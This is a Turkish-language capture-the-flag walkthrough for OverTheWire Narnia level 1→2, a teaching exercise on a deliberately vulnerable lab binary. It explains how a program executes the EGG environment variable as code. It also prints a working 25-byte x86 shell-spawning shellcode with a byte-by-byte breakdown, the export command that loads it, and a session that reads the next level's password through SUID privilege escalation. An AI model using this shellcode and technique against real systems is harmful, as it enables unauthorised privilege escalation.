# 💥 OverTheWire Narnia — Level 1 → Level 2
## Environment Variable Shellcode: İlk Kabuğunu Yaz

> Bu level'da hiç buffer taşırmıyoruz. Program bizden bir environment
> variable'a kod koymamızı istiyor ve onu **doğrudan çalıştırıyor**. Yani
> ilk **shellcode**'umuzu yazıp bir env değişkenine yerleştireceğiz. Burası
> "shellcode nedir, byte byte nasıl çalışır" sorusunun cevap yeri.

| | |
|---|---|
| **Bağlantı** | `ssh narnia1@narnia.labs.overthewire.org -p 2226` |
| **Kaynak** | `/narnia/narnia1.c` · binary: `/narnia/narnia1` |
| **Kavram** | Shellcode + environment variable üzerinden çalıştırma |
| **Zorluk** | ⭐⭐☆☆☆ |

**Bu level için gereken konular:**
- [`04_shellcode_ve_nop_sled.md`](../../konu_anlatimlari/binary_exploitation/04_shellcode_ve_nop_sled.md) — shellcode ve NOP sled detaylı
- [`00_x86_assembly_temelleri.md`](../../konu_anlatimlari/binary_exploitation/00_x86_assembly_temelleri.md) — shellcode'daki assembly'yi okumak için

---

## 🎯 Hedef

Program, `EGG` adlı environment variable'ın içeriğini bir **fonksiyon gibi çağırıyor**. Biz `EGG`'in içine `/bin/sh` açan makine kodunu (shellcode) koyarsak, program onu çalıştırıp bize narnia2 yetkisinde bir shell verir.

---

## 📖 Kaynak Kod

```c
#include <stdio.h>
#include <stdlib.h>

int main(){
    int (*ret)();          // ← bir fonksiyon pointer'ı

    if(getenv("EGG") == NULL){
        printf("Give me something to execute at the env-variable EGG\n");
        exit(1);
    }

    printf("Trying to execute EGG!\n");
    ret = getenv("EGG");   // ← ret = EGG'in bellekteki adresi
    ret();                 // ← O ADRESTEKİ BYTE'LARI KOD OLARAK ÇALIŞTIR

    return 0;
}
```

---

## 🔍 Kaynak Kodu Analizi — Açık Nerede?

Burada klasik bir "buffer overflow" yok. Açık, programın **kullanıcı verisini doğrudan kod olarak çalıştırması**:

```c
ret = getenv("EGG");   // ret = EGG'in adresi (char* ama fonksiyon pointer'a atanıyor)
ret();                 // ret'i çağır → EGG'in ilk byte'ından itibaren ÇALIŞTIR
```

`getenv("EGG")`, `EGG` değişkeninin **değerinin başlangıç adresini** döndürür. Bu adres bir `int (*ret)()` fonksiyon pointer'ına atanıp `ret()` ile çağrılıyor. İşlemci açısından bunun anlamı: *"EGG'in içindeki byte'lara git ve onları makine komutu olarak işle."*

Yani `EGG`'e ne koyarsak işlemci onu çalıştırır. Biz de oraya `/bin/sh` açan komutları (shellcode) koyacağız.

> 💡 **Çok önemli — adres aramaya gerek YOK.** narnia2/narnia4 gibi seviyelerde shellcode'un adresini GDB ile bulup EIP'ye yazıyoruz. Burada öyle bir derdimiz yok: program adresi `getenv` ile **kendisi buluyor** ve `ret()` ile **tam başından** çağırıyor. Bu yüzden NOP sled bile gerekmez — `EGG`'in ilk byte'ı zaten shellcode'un ilk byte'ı olur.

---

## 📚 Gereken Teori: Shellcode

**Shellcode**, doğrudan işlemcinin çalıştırdığı **ham makine kodudur**. Adını genelde `/bin/sh` açtığı için alır. `\x31\xc0` gibi gördüğün her şey bir *byte*'tır — text değil, işlemcinin anladığı komut.

Kullanacağımız 25 byte'lık klasik x86 Linux shellcode'u `execve("/bin//sh", ["/bin//sh"], NULL)` sistem çağrısını yapar. İşte byte byte ne yaptığı:

| Byte'lar | Assembly | Ne yapar |
|---|---|---|
| `\x31\xc0` | `xor eax, eax` | EAX = 0 |
| `\x50` | `push eax` | string sonuna `\0` (null) koy |
| `\x68\x2f\x2f\x73\x68` | `push 0x68732f2f` | stack'e `"//sh"` (little-endian) |
| `\x68\x2f\x62\x69\x6e` | `push 0x6e69622f` | stack'e `"/bin"` (little-endian) |
| `\x89\xe3` | `mov ebx, esp` | EBX → `"/bin//sh"` adresi |
| `\x50` | `push eax` | argv null-terminator |
| `\x53` | `push ebx` | argv[0] = `"/bin//sh"` |
| `\x89\xe1` | `mov ecx, esp` | ECX → argv dizisi |
| `\x89\xc2` | `mov edx, eax` | EDX = 0 (envp = NULL); EAX hâlâ 0 |
| `\xb0\x0b` | `mov al, 0x0b` | EAX = 11 = execve çağrı numarası |
| `\xcd\x80` | `int 0x80` | kernel'a geç → sistem çağrısını yap |

Birleşik hâli:

```
\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80
```

> 💡 **`\x89\xc2` (mov edx,eax) neden EDX'i sıfırlar?** O noktada EAX hâlâ 0 (başta `xor eax,eax` yaptık, aradaki komutlar EAX'i değiştirmedi). `mov edx,eax` → `edx = 0`. Alternatif olarak `\x31\xd2` (`xor edx,edx`) da aynı işi yapar. Bu rehber boyunca **tutarlılık için `\x89\xc2` varyantını** kullanıyoruz.

> 💡 **Neden null-byte yok?** `\x00` (null) çoğu string fonksiyonunu (`strcpy`, `getenv` sınırlarını) bozar. Bu shellcode hiç `\x00` içermez — bilinçli olarak `xor`/`mov al` gibi tekniklerle sıfır üretilir. Bu yüzden tercih edilir.

---

## 🧪 Adım Adım

Bu level'da GDB'ye bile gerek yok — sadece `EGG`'i kurup programı çalıştırıyoruz.

```bash
# 1. Shellcode'u EGG'e yaz (HAM byte → sys.stdout.buffer.write zorunlu)
narnia1@narnia:/narnia$ export EGG=$(python3 -c 'import sys; sys.stdout.buffer.write(b"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80")')

# 2. (opsiyonel kontrol) EGG gerçekten set oldu mu?
narnia1@narnia:/narnia$ env | grep EGG    # binary kareler/garip karakterler görmen normal — ham byte bunlar
```

---

## ▶️ Çalıştırma

```bash
narnia1@narnia:/narnia$ ./narnia1
Trying to execute EGG!
$ cat /etc/narnia_pass/narnia2
<şifre buraya gelir>
$ id
uid=14001(narnia1) gid=14001(narnia1) euid=14002(narnia2) ...
```

Şifre dosyasını okuyabildik — işimiz bitti. Kopyala, narnia2'ye geç.

> 💡 **`id` çıktısına dikkat:** `whoami` sana `narnia1` (real uid) gösterebilir ama **dosya erişimi `euid`'e (narnia2) bakar.** SUID binary euid'i narnia2 yaptığı için `/etc/narnia_pass/narnia2` okunabilir. Yani whoami narnia1 dese bile şifreyi okuyabilirsin — önemli olan `euid`.

---

## ⚠️ Yaygın Hatalar / Tuzaklar

**1. `print()` ile shellcode göndermek.**
Python 3'te `print("\x31\xc0...")` byte'ları UTF-8'e kodlar ve shellcode bozulur (`\xc0` → `\xc3\x80`). **Mutlaka** `sys.stdout.buffer.write(b"...")` kullan. Bu, ham byte içeren her payload için geçerli altın kural.

**2. Shell açıldı ama tam narnia2 olmadın (yetki düştü).**
Bazı shell'ler (`bash -p` olmadan) `euid != ruid` görünce yetkiyi `ruid`'e düşürür. Eğer `cat /etc/narnia_pass/narnia2` "Permission denied" derse, shellcode'un başına bir `setreuid(geteuid(), geteuid())` çağrısı ekleyen varyant kullan (önce uid'i sabitle, sonra `/bin/sh`). narnia1'de genelde plain shellcode yeter ama bilmekte fayda var.

**3. NOP sled eklemeye çalışmak.**
Gereksiz. `ret()`, `EGG`'in **tam başını** çağırdığı için sled'e gerek yok. Yine de eklersen (`\x90*N + shellcode`) çalışır — ama bu seviyede süs.

**4. `EGG`'i `export` etmeyi unutmak.**
`EGG=...` (export'suz) sadece o satırın değişkeni olur, programa geçmez. `export EGG=...` şart.

---

## ✅ Ne Öğrendik

- **Shellcode**, işlemcinin doğrudan çalıştırdığı ham makine kodudur; `/bin/sh` açan 25 byte'lık standart bir blok ezberlenebilir.
- Shellcode null-byte içermemeli (string fonksiyonları keser).
- Bir program kullanıcı verisini **kod olarak çalıştırırsa** (fonksiyon pointer'a atayıp çağırırsa), oraya shellcode koymak yeterlidir — adres bulmaya gerek kalmaz.
- `whoami` (ruid) ile dosya erişimi (`euid`) farklı şeylerdir; SUID'de şifreyi okuyan şey `euid`'dir.

Bir sonraki level'da shellcode'u bir env değişkenine değil, **taşırdığımız buffer'ın içine** koyacağız ve EIP'yi ona yönlendireceğiz — işte orada adres bulma ve NOP sled devreye girecek.

---

## ⬅️➡️ Gezinme

- **Önceki:** [Level 0 → Level 1 — Stack Buffer Overflow](./narnia_0-1.md)
- **Sonraki:** [Level 2 → Level 3 — EIP Kontrolü + NOP Sled](./narnia_2-3.md)

---

*Bu rehber [waitaseC137/linux_learning](https://github.com/waitaseC137/linux_learning) reposunun bir parçasıdır.*
